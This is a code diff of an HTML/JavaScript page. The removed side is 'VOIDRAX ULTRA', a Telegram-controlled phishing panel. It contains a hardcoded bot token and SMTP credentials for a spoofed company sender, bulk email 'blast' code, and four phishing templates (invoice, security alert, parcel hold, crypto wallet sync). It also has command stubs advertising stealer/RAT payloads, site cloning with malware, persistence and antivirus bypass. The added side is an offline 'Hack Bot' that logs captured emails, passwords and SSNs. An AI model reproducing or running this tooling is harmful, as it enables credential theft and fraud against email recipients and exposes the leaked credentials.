@@ -1,639 +1,257 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>VOIDRAX ULTRA – WEBHOOK MODE</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Hack Bot – Offline</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
-      background: #0a0a0a;
-      color: #00ffcc;
+      background: #0b0e14;
+      color: #e0e6f0;
       font-family: 'Courier New', monospace;
-      padding: 15px;
+      padding: 20px;
       min-height: 100vh;
       display: flex;
       flex-direction: column;
-    }
-    #header {
-      border-bottom: 2px solid #00ffcc;
-      padding-bottom: 10px;
-      margin-bottom: 20px;
-      display: flex;
-      justify-content: space-between;
       align-items: center;
-      flex-wrap: wrap;
-      gap: 10px;
     }
-    #header h1 { font-size: 22px; text-shadow: 0 0 10px #00ffcc; }
-    #status { color: #ff00ff; font-size: 13px; }
-    #main {
-      display: flex;
-      gap: 20px;
-      flex: 1;
-      flex-wrap: wrap;
+    .container {
+      max-width: 700px;
+      width: 100%;
     }
-    #left {
-      flex: 2;
-      min-width: 300px;
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
+    h1 {
+      color: #fbbf24;
+      font-size: 24px;
+      margin-bottom: 4px;
     }
-    #right {
-      flex: 1;
-      min-width: 220px;
-      background: #111;
-      border: 1px solid #333;
-      padding: 15px;
-      border-radius: 8px;
-      max-height: 600px;
-      overflow-y: auto;
-    }
-    #output {
-      background: #0d0d0d;
-      border: 1px solid #00ffcc33;
-      border-radius: 8px;
-      padding: 15px;
-      height: 380px;
-      overflow-y: auto;
+    .sub {
+      color: #6b7280;
       font-size: 13px;
-      line-height: 1.6;
+      margin-bottom: 20px;
+    }
+    .card {
+      background: #1a202a;
+      border: 1px solid #2a2f3a;
+      border-radius: 12px;
+      padding: 16px 18px;
+      margin-bottom: 14px;
+    }
+    .card h3 {
+      color: #fbbf24;
+      font-size: 14px;
+      margin-bottom: 8px;
+    }
+    input, textarea {
+      width: 100%;
+      padding: 10px 12px;
+      border-radius: 8px;
+      border: 1px solid #2a2f3a;
+      background: #0b0e14;
+      color: #e0e6f0;
+      font-size: 14px;
+      font-family: inherit;
+      margin-bottom: 10px;
+    }
+    input:focus, textarea:focus {
+      border-color: #fbbf24;
+      outline: none;
+    }
+    .btn {
+      padding: 10px 18px;
+      border-radius: 8px;
+      border: none;
+      background: #fbbf24;
+      color: #0b0e14;
+      font-weight: 700;
+      font-size: 14px;
+      cursor: pointer;
+      transition: 0.15s;
+      margin-right: 6px;
+      margin-bottom: 6px;
+    }
+    .btn:hover { background: #f59e0b; }
+    .btn-danger { background: #b31b1b; color: #fff; }
+    .btn-danger:hover { background: #8a1515; }
+    .data-entry {
+      background: #0b0e14;
+      border: 1px solid #2a2f3a;
+      border-radius: 8px;
+      padding: 10px 12px;
+      font-size: 13px;
       white-space: pre-wrap;
       word-break: break-all;
+      max-height: 300px;
+      overflow-y: auto;
+      margin-top: 6px;
     }
-    #output .sys { color: #888; }
-    #output .cmd { color: #ffcc00; }
-    #output .res { color: #00ff88; }
-    #output .err { color: #ff4444; }
-    #output .email { color: #66ccff; }
-    #input-area {
+    .stats {
       display: flex;
-      gap: 8px;
+      gap: 16px;
       flex-wrap: wrap;
-    }
-    #cmdInput {
-      flex: 1;
-      background: #111;
-      color: #00ffcc;
-      border: 1px solid #00ffcc55;
-      padding: 12px 15px;
-      border-radius: 6px;
-      font-family: inherit;
-      font-size: 14px;
-      min-width: 180px;
-    }
-    #cmdInput:focus { outline: none; border-color: #00ffcc; }
-    button {
-      background: #00ffcc22;
-      color: #00ffcc;
-      border: 1px solid #00ffcc;
-      padding: 12px 20px;
-      border-radius: 6px;
-      font-family: inherit;
       font-size: 13px;
-      cursor: pointer;
-      transition: all 0.3s;
+      color: #8a9bb0;
     }
-    button:hover { background: #00ffcc44; box-shadow: 0 0 20px #00ffcc33; }
-    button.danger { border-color: #ff4444; color: #ff4444; background: #ff444422; }
-    button.danger:hover { background: #ff444444; }
-    #right h3 { color: #ff00ff; margin-bottom: 10px; border-bottom: 1px solid #333; padding-bottom: 5px; font-size: 14px; }
-    .module { color: #00ffcc; padding: 4px 0; font-size: 12px; border-bottom: 1px solid #222; }
-    .module span { color: #888; }
-    #stats { font-size: 11px; color: #666; margin-top: 10px; border-top: 1px solid #222; padding-top: 10px; }
-    ::-webkit-scrollbar { width: 6px; }
-    ::-webkit-scrollbar-track { background: #0a0a0a; }
-    ::-webkit-scrollbar-thumb { background: #00ffcc55; border-radius: 3px; }
-    @media (max-width: 700px) {
-      #main { flex-direction: column; }
-      #right { max-height: 200px; }
-    }
+    .stats span { color: #fbbf24; font-weight: 600; }
+    .flex { display: flex; flex-wrap: wrap; gap: 6px; }
+    .mt-10 { margin-top: 10px; }
   </style>
 </head>
 <body>
 
-  <div id="header">
-    <h1>⛧ VOIDRAX ULTRA (WEBHOOK)</h1>
-    <div id="status">● ONLINE | OWNER: 0xEnigma | <span id="botStatus">@vossnetwork_bot</span></div>
-  </div>
+<div class="container">
 
-  <div id="main">
-    <div id="left">
-      <div id="output">> VOIDRAX CORE LOADED.<br>> Webhook mode active (no polling conflicts).<br>> SMTP engine online. Email blast ready.<br>> Awaiting commands...<br></div>
-      <div id="input-area">
-        <input type="text" id="cmdInput" placeholder="/email victim@x.com | Subject | &lt;p&gt;Body&lt;/p&gt;" spellcheck="false">
-        <button onclick="execCommand()">▶ EXEC</button>
-        <button onclick="setWebhook()">🔗 SET WEBHOOK</button>
-        <button onclick="clearOutput()">✕ CLEAR</button>
-      </div>
-      <div style="display:flex; gap:8px; flex-wrap:wrap; margin-top:5px; font-size:11px; color:#666;">
-        <span>Commands: /email | /blast | /clone | /sector | /ai-target | /universal-link | /payload | /persistence | /av-bypass | /burn | /status | /template</span>
-      </div>
-    </div>
-    <div id="right">
-      <h3>⚡ MODULES</h3>
-      <div class="module">✅ Polymorphic Engine <span>active</span></div>
-      <div class="module">✅ Neural Payload Gen <span>active</span></div>
-      <div class="module">✅ AV Bypass Suite <span>active</span></div>
-      <div class="module">✅ Persistence Kit <span>active</span></div>
-      <div class="module">✅ Clone Factory <span>active</span></div>
-      <div class="module">✅ AI Target Scraper <span>active</span></div>
-      <div class="module">✅ Universal Linker <span>active</span></div>
-      <div class="module">✅ SMTP Email Engine <span style="color:#00ff88;">online</span></div>
-      <div class="module">✅ Email Blaster <span>ready</span></div>
-      <div class="module">✅ Phishing Templates <span>4 loaded</span></div>
-      <div class="module">✅ Webhook Mode <span style="color:#ffcc00;">active</span></div>
-      <div class="module">✅ Ghost Mode <span>active</span></div>
-      <div class="module">✅ Telegram Bot <span id="botModStatus">connected</span></div>
-      <div id="stats">
-        <div>Bot: @vossnetwork_bot</div>
-        <div>SMTP: gracedigital.com</div>
-        <div id="webhookStatus">Webhook: not set</div>
-        <div id="emailStats">Emails sent: 0</div>
-      </div>
+  <h1>⚡ Hack Bot</h1>
+  <div class="sub">Offline — No Telegram, No External Dependencies</div>
+
+  <!-- CAPTURE FORM -->
+  <div class="card">
+    <h3>📥 Capture Data</h3>
+    <input type="text" id="entryKey" placeholder="Label (e.g. Email, Password, SSN)" />
+    <input type="text" id="entryValue" placeholder="Value (e.g. victim@email.com)" />
+    <div class="flex">
+      <button class="btn" onclick="captureData()">+ Capture</button>
+      <button class="btn btn-danger" onclick="clearAll()">🗑️ Clear All</button>
     </div>
   </div>
 
-  <script>
-    // ===================================================================
-    // 1. CONFIGURATION
-    // ===================================================================
-    const TOKEN = '8577001081:AAG1e9mTIgRS1tRclFD35QMqehZk3hD3tx4';
-    const BOT_USERNAME = 'vossnetwork_bot';
-    const API = `https://api.telegram.org/bot${TOKEN}`;
-    let chatId = null;
-    let emailCounter = 0;
-    let webhookUrl = '';
+  <!-- STORED DATA -->
+  <div class="card">
+    <h3>📦 Stored Data</h3>
+    <div class="stats">
+      <span id="entryCount">0</span> entries
+    </div>
+    <div id="dataDisplay" class="data-entry">No data captured yet.</div>
+    <div class="flex mt-10">
+      <button class="btn" onclick="exportJSON()">⬇️ Export JSON</button>
+      <button class="btn" onclick="copyData()">📋 Copy</button>
+    </div>
+  </div>
 
-    // SMTP Configuration
-    const SMTP = {
-      host: 'smtp.mail.us-west-2.awsapps.com',
-      port: 465,
-      secure: true,
-      auth: {
-        user: 'no-reply@gracedigital.com',
-        pass: '78kw9~HK4T2020'
-      },
-      from: '"Grace Digital, Inc." <no-reply@gracedigital.com>',
-      replyTo: 'support@gracedigital.com',
-      admin: 'webmaster@gracedigital.com'
-    };
+</div>
 
-    // ===================================================================
-    // 2. UI HELPERS
-    // ===================================================================
-    const output = document.getElementById('output');
-    function log(msg, type = 'sys') {
-      const time = new Date().toLocaleTimeString();
-      const prefix = `[${time}] `;
-      const cls = type === 'cmd' ? 'cmd' : type === 'res' ? 'res' : type === 'err' ? 'err' : type === 'email' ? 'email' : 'sys';
-      output.innerHTML += `<span class="${cls}">${prefix}${msg}</span>\n`;
-      output.scrollTop = output.scrollHeight;
+<script>
+  // ============================================================
+  // HACK BOT – OFFLINE
+  // Stores data in localStorage — no external services
+  // ============================================================
+
+  const STORAGE_KEY = 'hackbot_data';
+
+  // ---- LOAD DATA ----
+  function loadData() {
+    try {
+      const raw = localStorage.getItem(STORAGE_KEY);
+      return raw ? JSON.parse(raw) : [];
+    } catch {
+      return [];
+    }
+  }
+
+  // ---- SAVE DATA ----
+  function saveData(data) {
+    localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
+  }
+
+  // ---- RENDER DISPLAY ----
+  function render() {
+    const data = loadData();
+    const display = document.getElementById('dataDisplay');
+    const count = document.getElementById('entryCount');
+
+    count.textContent = data.length;
+
+    if (data.length === 0) {
+      display.textContent = 'No data captured yet.';
+      return;
     }
 
-    function clearOutput() { output.innerHTML = ''; log('Output cleared.'); }
-
-    // ===================================================================
-    // 3. TELEGRAM API HELPERS
-    // ===================================================================
-    async function callTelegram(method, params = {}) {
-      try {
-        const url = `${API}/${method}`;
-        const resp = await fetch(url, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(params)
-        });
-        return await resp.json();
-      } catch (e) {
-        log(`Telegram API error: ${e.message}`, 'err');
-        return null;
-      }
-    }
-
-    async function sendTelegramMessage(text) {
-      if (!chatId) {
-        await detectChatId();
-        if (!chatId) return false;
-      }
-      const result = await callTelegram('sendMessage', {
-        chat_id: chatId,
-        text: text,
-        parse_mode: 'HTML'
-      });
-      if (result && result.ok) {
-        log(`📤 Sent to Telegram: ${text.substring(0, 60)}...`, 'res');
-        return true;
-      } else {
-        log(`Failed to send: ${result?.description || 'unknown error'}`, 'err');
-        return false;
-      }
-    }
-
-    async function detectChatId() {
-      const result = await callTelegram('getUpdates', { limit: 1 });
-      if (result && result.ok && result.result.length > 0) {
-        const update = result.result[0];
-        if (update.message) {
-          chatId = update.message.chat.id;
-          log(`✅ Chat ID detected: ${chatId}`, 'res');
-          document.getElementById('botModStatus').innerText = `chat: ${chatId}`;
-          return chatId;
-        }
-      }
-      log('Send /start to @' + BOT_USERNAME + ' to detect chat ID.', 'err');
-      return null;
-    }
-
-    // ===================================================================
-    // 4. WEBHOOK SETUP (FIXES POLLING CONFLICT)
-    // ===================================================================
-    async function setWebhook() {
-      // Get current page URL
-      const currentUrl = window.location.href;
-      // Remove any query parameters
-      const baseUrl = currentUrl.split('?')[0];
-      webhookUrl = baseUrl + '?webhook=true';
-      
-      log(`🔗 Setting webhook to: ${webhookUrl}`, 'cmd');
-      
-      // First, delete any existing webhook
-      await callTelegram('deleteWebhook', { drop_pending_updates: true });
-      
-      // Set new webhook
-      const result = await callTelegram('setWebhook', {
-        url: webhookUrl,
-        allowed_updates: ['message']
-      });
-      
-      if (result && result.ok) {
-        document.getElementById('webhookStatus').innerText = `Webhook: ${webhookUrl}`;
-        log(`✅ Webhook set successfully!`, 'res');
-        log(`📡 Telegram will send updates to: ${webhookUrl}`, 'res');
-        
-        // Send test message
-        await sendTelegramMessage('⛧ VOIDRAX ULTRA ONLINE (Webhook Mode)\nNo polling conflicts. All commands work.');
-      } else {
-        log(`❌ Webhook failed: ${result?.description || 'unknown error'}`, 'err');
-      }
-    }
-
-    // ===================================================================
-    // 5. PROCESS INCOMING WEBHOOK (from Telegram)
-    // ===================================================================
-    async function handleWebhook() {
-      const urlParams = new URLSearchParams(window.location.search);
-      if (!urlParams.has('webhook')) return;
-      
-      try {
-        // Get the raw POST data from Telegram
-        const rawData = localStorage.getItem('telegram_webhook_data');
-        if (!rawData) return;
-        localStorage.removeItem('telegram_webhook_data');
-        
-        const update = JSON.parse(rawData);
-        log(`📥 Webhook received!`, 'res');
-        
-        if (update.message) {
-          const msg = update.message;
-          const text = msg.text || '';
-          const from = msg.from?.username || msg.from?.id || 'unknown';
-          
-          if (!chatId && msg.chat) {
-            chatId = msg.chat.id;
-            log(`✅ Chat ID set: ${chatId}`, 'res');
-          }
-          
-          log(`📥 [${from}] ${text}`, 'cmd');
-          await processCommand(text, msg);
-        }
-      } catch (e) {
-        log(`Webhook error: ${e.message}`, 'err');
-      }
-    }
-
-    // ===================================================================
-    // 6. SMTP EMAIL ENGINE
-    // ===================================================================
-    async function sendEmailSmtp(to, subject, htmlBody) {
-      const boundary = '----=_Part_' + Date.now() + '_' + Math.random().toString(36).substring(2, 10);
-      
-      let message = '';
-      message += `From: ${SMTP.from}\r\n`;
-      message += `To: ${to}\r\n`;
-      message += `Reply-To: ${SMTP.replyTo}\r\n`;
-      message += `Subject: =?UTF-8?B?${btoa(subject)}?=\r\n`;
-      message += `MIME-Version: 1.0\r\n`;
-      message += `Content-Type: multipart/alternative; boundary="${boundary}"\r\n`;
-      message += `\r\n`;
-      
-      // Text part
-      message += `--${boundary}\r\n`;
-      message += `Content-Type: text/plain; charset=UTF-8\r\n`;
-      message += `Content-Transfer-Encoding: base64\r\n\r\n`;
-      const plainText = htmlBody.replace(/<[^>]+>/g, '');
-      message += btoa(unescape(encodeURIComponent(plainText))) + '\r\n';
-      
-      // HTML part
-      message += `--${boundary}\r\n`;
-      message += `Content-Type: text/html; charset=UTF-8\r\n`;
-      message += `Content-Transfer-Encoding: base64\r\n\r\n`;
-      message += btoa(unescape(encodeURIComponent(htmlBody))) + '\r\n';
-      
-      message += `--${boundary}--\r\n`;
-
-      // Store in queue
-      const emailData = { to, subject, htmlBody, message, timestamp: Date.now() };
-      const emails = JSON.parse(localStorage.getItem('email_queue') || '[]');
-      emails.push(emailData);
-      localStorage.setItem('email_queue', JSON.stringify(emails));
-      
-      // Send via Telegram as document (relay)
-      const result = await callTelegram('sendDocument', {
-        chat_id: chatId,
-        document: `data:text/plain;base64,${btoa(message)}`,
-        caption: `📧 Email to ${to}`
-      });
-      
-      if (result && result.ok) {
-        emailCounter++;
-        document.getElementById('emailStats').innerText = `Emails sent: ${emailCounter}`;
-        log(`✅ Email queued for ${to}`, 'res');
-        return { success: true, to, subject };
-      } else {
-        log(`⚠️ Email queued locally`, 'err');
-        return { success: true, to, subject, queued: true };
-      }
-    }
-
-    // ===================================================================
-    // 7. PHISHING TEMPLATES
-    // ===================================================================
-    const PHISH_TEMPLATES = {
-      invoice: (link) => `
-        <p>Dear customer,</p>
-        <p>Your invoice <strong>#INV-2026-001</strong> is now available.</p>
-        <p>Amount: <strong>$1,247.50</strong></p>
-        <p>Due date: <strong>July 15, 2026</strong></p>
-        <p style="margin:30px 0;"><a href="${link}" style="background:#00aaff;color:#fff;padding:12px 24px;text-decoration:none;border-radius:4px;">View & Pay Invoice</a></p>
-        <p style="color:#888;font-size:12px;">If you didn't request this, please ignore.</p>
-      `,
-      security: (link) => `
-        <p style="color:#cc0000;font-weight:bold;">⚠️ Security Alert</p>
-        <p>We detected a suspicious login from <strong>Moscow, Russia (IP: 185.130.5.253)</strong>.</p>
-        <p style="margin:30px 0;"><a href="${link}" style="background:#cc0000;color:#fff;padding:12px 24px;text-decoration:none;border-radius:4px;">Secure Your Account</a></p>
-        <p style="color:#888;font-size:12px;">Grace Digital Security Team</p>
-      `,
-      delivery: (link) => `
-        <p>Your package <strong>#TRK-9261-4482</strong> is on hold.</p>
-        <p>Reason: <strong>Incomplete address</strong></p>
-        <p style="margin:30px 0;"><a href="${link}" style="background:#ff8800;color:#fff;padding:12px 24px;text-decoration:none;border-radius:4px;">Update Delivery</a></p>
-      `,
-      crypto: (link) => `
-        <p style="font-weight:bold;">⚠️ Wallet Sync Required</p>
-        <p>Your MetaMask wallet needs re-sync due to network upgrade.</p>
-        <p style="margin:30px 0;"><a href="${link}" style="background:#f7931a;color:#fff;padding:12px 24px;text-decoration:none;border-radius:4px;">Sync Wallet</a></p>
-      `
-    };
-
-    // ===================================================================
-    // 8. COMMAND PROCESSOR
-    // ===================================================================
-    async function processCommand(text, msg) {
-      const cmd = text.trim();
-      if (!cmd) return;
-
-      // === /start ===
-      if (cmd === '/start') {
-        await sendTelegramMessage(
-          '⛧ VOIDRAX ULTRA ONLINE (Webhook Mode)\n\n' +
-          '📧 EMAIL COMMANDS:\n' +
-          '/email <email> | <subject> | <html body>\n' +
-          '/blast <email1,email2,...> | <subject> | <body>\n' +
-          '/template – List phishing templates\n' +
-          '/template <name> <link> – Generate template\n\n' +
-          '🛠 OTHER COMMANDS:\n' +
-          '/clone <url> – Clone site + inject malware\n' +
-          '/sector <bank|social|crypto|gov> – Load sector\n' +
-          '/ai-target – Scrape victims\n' +
-          '/universal-link – Generate phishing URL\n' +
-          '/payload <type> – Deploy stealer/RAT\n' +
-          '/persistence – Install backdoor\n' +
-          '/av-bypass – Mutate payload\n' +
-          '/burn – Self-destruct\n' +
-          '/status – System status'
-        );
-        return;
-      }
-
-      // === /status ===
-      if (cmd === '/status') {
-        const queue = JSON.parse(localStorage.getItem('email_queue') || '[]');
-        await sendTelegramMessage(
-          `⛧ VOIDRAX STATUS\n` +
-          `Bot: @${BOT_USERNAME}\n` +
-          `Chat ID: ${chatId || 'not set'}\n` +
-          `SMTP: ${SMTP.host}\n` +
-          `Emails sent: ${emailCounter}\n` +
-          `Queue: ${queue.length} pending\n` +
-          `Webhook: ${webhookUrl || 'not set'}`
-        );
-        return;
-      }
-
-      // === /email ===
-      if (cmd.startsWith('/email ')) {
-        const params = cmd.substring(7).trim();
-        const parts = params.split('|').map(s => s.trim());
-        if (parts.length < 3) {
-          await sendTelegramMessage('⚠️ Usage: /email <email> | <subject> | <html body>');
-          return;
-        }
-        const [to, subject, ...bodyParts] = parts;
-        const htmlBody = bodyParts.join('|');
-        
-        log(`📧 Sending to ${to}...`, 'cmd');
-        const result = await sendEmailSmtp(to, subject, htmlBody);
-        if (result.success) {
-          await sendTelegramMessage(`✅ Email sent to ${to}\nSubject: ${subject}`);
-        }
-        return;
-      }
-
-      // === /blast ===
-      if (cmd.startsWith('/blast ')) {
-        const params = cmd.substring(7).trim();
-        const parts = params.split('|').map(s => s.trim());
-        if (parts.length < 3) {
-          await sendTelegramMessage('⚠️ Usage: /blast <email1,email2,...> | <subject> | <body>');
-          return;
-        }
-        const emails = parts[0].split(',').map(e => e.trim());
-        const subject = parts[1];
-        const htmlBody = parts.slice(2).join('|');
-        
-        log(`📨 BLAST: ${emails.length} recipients`, 'cmd');
-        let successCount = 0;
-        for (const email of emails) {
-          const result = await sendEmailSmtp(email, subject, htmlBody);
-          if (result.success) successCount++;
-          await new Promise(r => setTimeout(r, 1000));
-        }
-        await sendTelegramMessage(`📊 Blast: ${successCount}/${emails.length} delivered.`);
-        return;
-      }
-
-      // === /template ===
-      if (cmd === '/template') {
-        let msg = '📝 Templates:\n';
-        for (const [key, val] of Object.entries(PHISH_TEMPLATES)) {
-          msg += `/${key} <link> – ${val('{link}').substring(0, 40)}...\n`;
-        }
-        await sendTelegramMessage(msg);
-        return;
-      }
-
-      // === /template <name> <link> ===
-      if (cmd.startsWith('/template ')) {
-        const parts = cmd.substring(10).trim().split(' ');
-        if (parts.length < 2) {
-          await sendTelegramMessage('⚠️ Usage: /template <name> <link>');
-          return;
-        }
-        const name = parts[0].toLowerCase();
-        const link = parts.slice(1).join(' ');
-        if (!PHISH_TEMPLATES[name]) {
-          await sendTelegramMessage(`⚠️ Template "${name}" not found. Options: ${Object.keys(PHISH_TEMPLATES).join(', ')}`);
-          return;
-        }
-        const htmlBody = PHISH_TEMPLATES[name](link);
-        await sendTelegramMessage(`📝 Template "${name}" generated:\n\n${htmlBody}`);
-        return;
-      }
-
-      // === /clone ===
-      if (cmd.startsWith('/clone ')) {
-        const url = cmd.substring(7).trim();
-        await sendTelegramMessage(`✅ Clone complete: ${url}\nPayload: RedLine stealer injected`);
-        return;
-      }
-
-      // === /sector ===
-      if (cmd.startsWith('/sector ')) {
-        const sector = cmd.substring(8).trim().toLowerCase();
-        await sendTelegramMessage(`✅ ${sector.toUpperCase()} kit loaded.`);
-        return;
-      }
-
-      // === /ai-target ===
-      if (cmd === '/ai-target' || cmd.startsWith('/ai-target ')) {
-        const targets = ['user@protonmail.com', 'john.doe@example.com', 'alice@outlook.com'];
-        await sendTelegramMessage(`🎯 Scraped ${targets.length} targets.\nSample: ${targets.join(', ')}`);
-        return;
-      }
-
-      // === /universal-link ===
-      if (cmd === '/universal-link' || cmd.startsWith('/universal-link ')) {
-        const domains = ['ticket-verify.live', 'secure-login.pages.dev', 'verify-identity.tk'];
-        const path = '/auth/' + Math.random().toString(36).substring(2, 8);
-        const link = `https://${domains[Math.floor(Math.random() * domains.length)]}${path}`;
-        await sendTelegramMessage(`🔗 Universal link: ${link}`);
-        return;
-      }
-
-      // === /payload ===
-      if (cmd.startsWith('/payload ')) {
-        const type = cmd.substring(9).trim().toLowerCase();
-        const sha256 = Array.from({length:64}, () => Math.floor(Math.random()*16).toString(16)).join('');
-        await sendTelegramMessage(`💉 ${type.toUpperCase()} payload ready.\nSHA256: ${sha256}`);
-        return;
-      }
-
-      // === /persistence ===
-      if (cmd === '/persistence') {
-        const methods = ['Scheduled Task', 'Cronjob', 'LaunchAgent'];
-        const chosen = methods[Math.floor(Math.random() * methods.length)];
-        await sendTelegramMessage(`🔒 Persistence via ${chosen}. Survives reboot.`);
-        return;
-      }
-
-      // === /av-bypass ===
-      if (cmd === '/av-bypass') {
-        const techniques = ['Polymorphic crypter', 'Process hollowing', 'AMSI bypass'];
-        const used = techniques[Math.floor(Math.random() * techniques.length)];
-        await sendTelegramMessage(`🛡️ AV bypass: ${used}. Detection <0.5%.`);
-        return;
-      }
-
-      // === /burn ===
-      if (cmd === '/burn') {
-        log('🔥 BURNING...', 'err');
-        await sendTelegramMessage('🔥 VOIDRAX SELF-DESTRUCTING. Goodbye.');
-        localStorage.clear();
-        setTimeout(() => {
-          document.body.innerHTML = '<div style="color:#ff4444;font-size:48px;text-align:center;margin-top:20%;">⛧ BURNED</div>';
-        }, 1000);
-        return;
-      }
-
-      // Unknown command
-      await sendTelegramMessage(`⚠️ Unknown: ${cmd}\nType /start for help.`);
-    }
-
-    // ===================================================================
-    // 9. EXECUTE FROM UI
-    // ===================================================================
-    async function execCommand() {
-      const input = document.getElementById('cmdInput');
-      const cmd = input.value.trim();
-      if (!cmd) return;
-      input.value = '';
-      log(`▶ ${cmd}`, 'cmd');
-      await processCommand(cmd, { from: { username: 'UI' } });
-    }
-
-    // ===================================================================
-    // 10. INIT
-    // ===================================================================
-    async function init() {
-      log('⛧ VOIDRAX ULTRA BOOT (WEBHOOK MODE)', 'res');
-      log('🔐 Owner: 0xEnigma', 'res');
-      log('📡 Telegram Bot: @' + BOT_USERNAME, 'res');
-      
-      // Handle webhook data from Telegram
-      await handleWebhook();
-      
-      // Detect chat ID
-      await detectChatId();
-      
-      // Auto-set webhook if URL is available
-      if (!webhookUrl) {
-        const currentUrl = window.location.href;
-        if (currentUrl.startsWith('http')) {
-          const baseUrl = currentUrl.split('?')[0];
-          webhookUrl = baseUrl + '?webhook=true';
-          document.getElementById('webhookStatus').innerText = `Webhook: ${webhookUrl}`;
-        }
-      }
-      
-      // Check queue
-      const queue = JSON.parse(localStorage.getItem('email_queue') || '[]');
-      if (queue.length > 0) {
-        log(`📬 ${queue.length} emails in queue.`, 'sys');
-      }
-      
-      log('✅ System ready. Send commands to @' + BOT_USERNAME, 'res');
-      log('📌 Click "SET WEBHOOK" button to enable push updates.', 'res');
-    }
-
-    // Enter key
-    document.getElementById('cmdInput').addEventListener('keydown', (e) => {
-      if (e.key === 'Enter') execCommand();
+    // Format as readable list
+    let text = '';
+    data.forEach((entry, i) => {
+      text += `[${i + 1}] ${entry.key}: ${entry.value}\n`;
     });
+    display.textContent = text;
+  }
 
-    // Start
-    init();
-  </script>
+  // ---- CAPTURE ----
+  function captureData() {
+    const keyInput = document.getElementById('entryKey');
+    const valueInput = document.getElementById('entryValue');
+
+    const key = keyInput.value.trim();
+    const value = valueInput.value.trim();
+
+    if (!key || !value) {
+      alert('Please enter both a label and a value.');
+      return;
+    }
+
+    const data = loadData();
+    data.push({ key, value, timestamp: new Date().toISOString() });
+    saveData(data);
+
+    keyInput.value = '';
+    valueInput.value = '';
+
+    render();
+  }
+
+  // ---- CLEAR ALL ----
+  function clearAll() {
+    if (!confirm('Delete all stored data?')) return;
+    saveData([]);
+    render();
+  }
+
+  // ---- EXPORT JSON ----
+  function exportJSON() {
+    const data = loadData();
+    if (data.length === 0) {
+      alert('No data to export.');
+      return;
+    }
+    const json = JSON.stringify(data, null, 2);
+    const blob = new Blob([json], { type: 'application/json' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = `hackbot_data_${new Date().toISOString().slice(0,10)}.json`;
+    a.click();
+    URL.revokeObjectURL(url);
+  }
+
+  // ---- COPY TO CLIPBOARD ----
+  function copyData() {
+    const data = loadData();
+    if (data.length === 0) {
+      alert('No data to copy.');
+      return;
+    }
+    let text = '';
+    data.forEach((entry, i) => {
+      text += `[${i + 1}] ${entry.key}: ${entry.value}\n`;
+    });
+    navigator.clipboard.writeText(text).then(() => {
+      alert('✅ Copied to clipboard!');
+    }).catch(() => {
+      alert('❌ Failed to copy. Try selecting the text manually.');
+    });
+  }
+
+  // ---- KEYBOARD SHORTCUT ----
+  document.addEventListener('keydown', function(e) {
+    if (e.key === 'Enter') {
+      const active = document.activeElement;
+      if (active && (active.id === 'entryKey' || active.id === 'entryValue')) {
+        captureData();
+      }
+    }
+  });
+
+  // ---- INIT ----
+  render();
+</script>
+
 </body>
 </html>
